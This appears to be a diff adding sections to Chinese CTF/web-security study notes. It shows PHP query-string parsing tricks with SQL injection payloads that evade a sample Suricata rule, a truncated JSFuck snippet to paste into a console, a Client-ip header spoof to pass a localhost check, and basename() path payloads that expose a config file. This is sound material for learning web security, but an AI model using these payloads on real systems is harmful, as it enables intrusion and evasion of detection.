@@ -1394,3 +1394,131 @@ get_machine_id()：  系统id  /etc/machine-id    或者docker环境id /proc/sel
 ## putenv('PATH=/home/rceservice/jail');
 
 因为`putenv('PATH=/home/rceservice/jail');`修改了环境变量，所以只能使用绝对路径使用cat命令，`cat`命令在`/bin`文件夹下
+
+
+
+# 利用PHP的字符串解析特性Bypass
+
+**我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => "bar")。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：**
+
+```
+/news.php?%20news[id%00=42"+AND+1=0--
+```
+
+上述PHP语句的参数%20news[id%00的值将存储到$_GET["news_id"]中。
+
+HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
+
+> 1.删除空白符
+>
+> 2.将某些字符转换为下划线（包括空格）
+
+例如：
+
+|  User input   | Decoded PHP | variable name |
+| :-----------: | :---------: | :-----------: |
+| %20foo_bar%00 |   foo_bar   |    foo_bar    |
+| foo%20bar%00  |   foo bar   |    foo_bar    |
+|   foo%5bbar   |   foo[bar   |    foo_bar    |
+
+## Suricata
+
+也许你也听过这款软件，Suricata是一个“开源、成熟、快速、强大的网络威胁检测引擎”，它的引擎能够进行实时入侵检测（IDS）、入侵防御系统（IPS）、网络安全监控（NSM）和离线流量包处理。
+
+在Suricata中你可以自定义一个HTTP流量的检测规则。假设你有这样一个规则：
+
+```
+alert http any any -> $HOME_NET any (\
+    msg: "Block SQLi"; flow:established,to_server;\
+    content: "POST"; http_method;\
+    pcre: "/news_id=[^0-9]+/Pi";\
+    sid:1234567;\
+)
+```
+
+简单来说，上述规则会检查news_id的值是否是数字。那么根据上述知识，我们可以很容易的绕过防御，如下所示：
+
+```
+/?news[id=1%22+AND+1=1--'
+/?news%5bid=1%22+AND+1=1--'
+/?news_id%00=1%22+AND+1=1--'
+```
+
+其他更多参考:
+
+[利用PHP的字符串解析特性Bypass - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/213359.html)
+
+
+
+# jsfuck
+
+形如
+
++[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+
+
+应该就是jsfuck
+
+复制下来输入到控制台回车即可
+
+
+
+# $ip = getIp();
+
+具体waf:
+
+```
+$ip = getIp();
+if($ip!='127.0.0.1')
+echo "Sorry,you don't have permission!  Your ip is :".$ip;
+```
+
+绕过方法:
+
+使用burp抓包后在后面添加:
+
+`Client-ip: 127.0.0.1`
+
+
+
+# $_SERVER['PHP_SELF']
+
+$_SERVER['PHP_SELF']代表的当前php文件的绝对路径
+
+
+
+# basename()漏洞
+
+basename() 函数返回路径中的文件名部分。但是它有个小问题，它会去掉文件名开头的非ASCII值。比如：
+
+```
+$url1 = “path/index.php”; // 返回index.php
+$url2 = “path/index.php”.urldecode(’%D1%A7%CF’); // 返回index.php和乱码
+$url3 = urldecode(’%D1%A7%CF%B0flag.php+ '); // 返回flag.php，前面的非acsii被删除
+$url4 = urldecode(’%74%65%73%74%5fflag.php+%D1%A7%CF%B0 '); // 返回flag.php和 后面的非ascii
+```
+
+一道例题源码:
+
+```
+include 'config.php'; // FLAG is defined in config.php
+
+if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
+  exit("I don't know what you are thinking, but I won't let you read it :)");
+}
+
+if (isset($_GET['source'])) {
+  highlight_file(basename($_SERVER['PHP_SELF']));
+  exit();
+}
+```
+
+payload:
+
+```
+…/index.php/config.php/%ff?source
+…/index.php/config.php/%a1?source
+…/index.php/config.php/%df?source
+```
+
+上面的payload随便哪一个都可以，**主要是保证config.php后面必须是非ascii值就可以了**
+
